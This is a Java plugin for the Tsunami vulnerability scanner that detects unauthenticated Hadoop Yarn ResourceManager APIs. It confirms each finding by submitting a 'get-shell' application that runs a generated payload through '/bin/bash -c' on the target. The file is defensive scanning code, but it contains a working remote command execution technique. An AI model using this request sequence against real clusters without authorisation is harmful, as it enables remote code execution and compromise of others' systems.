/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.exposedui.hadoop.yarn;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.base.Ascii;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import com.google.gson.JsonSyntaxException;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Optional;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects exposed and unauthenticated Hadoop Yarn ResourceManager API.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "YarnExposedManagerApiDetector",
    version = "0.1",
    description =
        "This detector checks whether the ResourceManager API of Hadoop Yarn is exposed and allows"
            + " unauthenticated code execution.",
    author = "Tsunami Team (tsunami-dev@google.com)",
    bootstrapModule = YarnExposedManagerApiDetectorBootstrapModule.class)
public final class YarnExposedManagerApiDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String VULN_ID = "HADOOP_YARN_UNAUTHENTICATED_RESOURCE_MANAGER_API";

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  // polling parameters, 30 seconds altogether
  // polling rate in milliseconds
  private static final int POLLING_RATE = 1000;
  // max number of polling attempts
  private static final int POLLING_ATTEMPTS = 30;

  @Inject
  public YarnExposedManagerApiDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting unauthenticated Apache Yarn ResourceManager API detection");

    DetectionReportList detectionReports =
        DetectionReportList.newBuilder()
            .addAllDetectionReports(
                matchedServices.stream()
                    .filter(NetworkServiceUtils::isWebService)
                    .filter(this::isUnauthenticatedYarnManager)
                    .filter(this::isServiceVulnerable)
                    .map(networkService -> buildDetectionReport(targetInfo, networkService))
                    .collect(toImmutableList()))
            .build();

    logger.atInfo().log(
        "YarnExposedManagerApiDetector finished, detected '%d' vulns.",
        detectionReports.getDetectionReportsCount());
    return detectionReports;
  }

  private boolean isUnauthenticatedYarnManager(NetworkService networkService) {
    // Unauthenticated Yarn always identifies user as "dr.who".
    String clusterInfoUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "cluster/cluster";
    try {
      HttpResponse response =
          httpClient.send(get(clusterInfoUrl).withEmptyHeaders().build(), networkService);
      return response.status().isSuccess()
          && response
              .bodyString()
              .map(Ascii::toLowerCase)
              .map(
                  body ->
                      body.contains("hadoop")
                          && body.contains("resourcemanager")
                          && body.contains("logged in as: dr.who"))
              .orElse(false);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query Hadoop Yarn cluster info page.");
      return false;
    }
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    YarnAttack attacker = new YarnAttack(networkService);
    return attacker.launch();
  }

  private DetectionReport buildDetectionReport(
      TargetInfo scannedTarget, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(scannedTarget)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue(VULN_ID))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Hadoop Yarn Unauthenticated ResourceManager API")
                // TODO(b/147455448): determine CVSS score.
                .setDescription(
                    "Hadoop Yarn ResourceManager controls the computation and storage resources of"
                        + " a Hadoop cluster. Unauthenticated ResourceManager API allows any"
                        + " remote users to create and execute arbitrary applications on the"
                        + " host.")
                .setRecommendation(
                    "Set up authentication by following the instructions at"
                        + " https://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-common/HttpAuthentication.html."))
        .build();
  }

  // Helper method to create a new application-id.
  // Returns null, if unsuccessful - instead of catch-and-rethrow
  // this method is likely to be executed frequently
  private String createNewAppId(NetworkService networkService) {
    String appId = null;

    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "ws/v1/cluster/apps/new-application";
    logger.atInfo().log("Trying creating a new application on target '%s'", targetUri);

    try {
      HttpResponse response =
          httpClient.send(post(targetUri).withEmptyHeaders().build(), networkService);

      if (response.status().isSuccess() && response.bodyJson().isPresent()) {
        JsonObject jsonResponse = (JsonObject) response.bodyJson().get();
        JsonPrimitive appIdPrimitive = jsonResponse.getAsJsonPrimitive("application-id");
        if (appIdPrimitive != null) {
          appId = appIdPrimitive.getAsString();

          logger.atInfo().log(
              "Plugin successfully created a new Hadoop application '%s' on scan target!", appId);

        } else {
          logger.atFine().log(
              "Error creating new Hadoop application on target '%s', service did not return an"
                  + " application-id",
              targetUri);
        }
      }

    } catch (ClassCastException e) {
      logger.atFine().withCause(e).log(
          "Error creating new Hadoop application on target '%s', unexpected response", targetUri);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log(
          "Error creating new Hadoop application on target '%s'", targetUri);
    } catch (JsonSyntaxException e) {
      logger.atInfo().log(
          "Hadoop Yarn NewApplication API response cannot be parsed as valid json. Maybe targeting"
              + " an unexpected service?");
    } catch (IllegalStateException e) {
      logger.atWarning().withCause(e).log(
          "JSON object parsing error for target URI: '%s'.", targetUri);
    }

    return appId;
  }

  // Oneshot helper class to carry out the full attack against Yarn
  private class YarnAttack {
    private String appId;
    private final NetworkService networkService;
    private Payload tsunamiPayload;
    private HttpRequest yarnRequest;

    // networkService is the target service to attack
    public YarnAttack(NetworkService networkService) {
      this.networkService = networkService;
    }

    private void craftYarnCommandExecutionPayload() {

      // Tell the PayloadGenerator what kind of vulnerability we are detecting so that it returns
      // the best payload for that environment. See the proto definition to understand what these
      // options mean.
      PayloadGeneratorConfig config =
          PayloadGeneratorConfig.newBuilder()
              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
              .setInterpretationEnvironment(
                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
              .setExecutionEnvironment(
                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
              .build();

      // Pass in the config to get the actual payload from the generator.
      // If the Tsunami callback server is configured, the generator will always try to return a
      // callback-enabled payload.
      tsunamiPayload = payloadGenerator.generate(config);

      // tsunamiPayload.getPayload() returns the actual payload String. You may need to
      // serialize/encode/format it to suit the specific vulnerability. Here, we inject it into a
      // shell command.
      String toBeExecuted = tsunamiPayload.getPayload();

      JsonObject root = new JsonObject();
      root.addProperty("application-id", appId);
      root.addProperty("application-name", "get-shell");
      root.addProperty("application-type", "YARN");
      JsonObject commands = new JsonObject();
      String cmd = String.format("/bin/bash -c '%s'", toBeExecuted);
      commands.addProperty("command", cmd);
      JsonObject amContainerSpec = new JsonObject();
      amContainerSpec.add("commands", commands);
      root.add("am-container-spec", amContainerSpec);

      String jsonStr = root.toString();
      ByteString yarnCompletePayload = ByteString.copyFromUtf8(jsonStr);

      logger.atFine().log("Trying to execute via Yarn: %s", jsonStr);

      HttpHeaders headersJsonContentType =
          HttpHeaders.builder().addHeader("Content-Type", "application/json").build();

      String targetUri =
          NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "ws/v1/cluster/apps";

      // Inject the payload into the vulnerable service
      yarnRequest =
          HttpRequest.post(targetUri)
              .setHeaders(headersJsonContentType)
              .setRequestBody(yarnCompletePayload)
              .build();
    }

    private boolean mountAttack() {

      try {
        HttpResponse res = httpClient.send(yarnRequest, networkService);

        // We can then validate whether the payload was executed using payload.checkWithExecuted. If
        // so, the vulnerability is detected! Depending on the vulnerability type, checkIfExecuted
        // may not need any input.
        logger.atInfo().log(
            "Yarn got http response: %s", res.status().isSuccess() ? "success" : "failure");
        if (!res.status().isSuccess()) {
          return false;
        }

        Optional<ByteString> resBody = res.bodyBytes();

        // execution is asyncronous
        logger.atInfo().log(
            "Waiting for the Yarn payload to be executed asyncronously."
                + " Timeout of the polling operation is %d ms.",
            POLLING_RATE * POLLING_ATTEMPTS);

        int attempts = 0;
        while (true) {
          if (tsunamiPayload.checkIfExecuted(resBody)) {
            logger.atInfo().log("Yarn Tsunami payload was executed!");
            return true;
          }
          attempts++;
          if (attempts >= POLLING_ATTEMPTS) {
            break;
          }

          Thread.sleep(POLLING_RATE);
        }
      } catch (IOException | InterruptedException e) {
        // fine
      }

      return false;
    }

    public boolean launch() {
      appId = createNewAppId(networkService);
      if (appId == null) {
        return false;
      }

      craftYarnCommandExecutionPayload();

      return mountAttack();
    }
  }
}
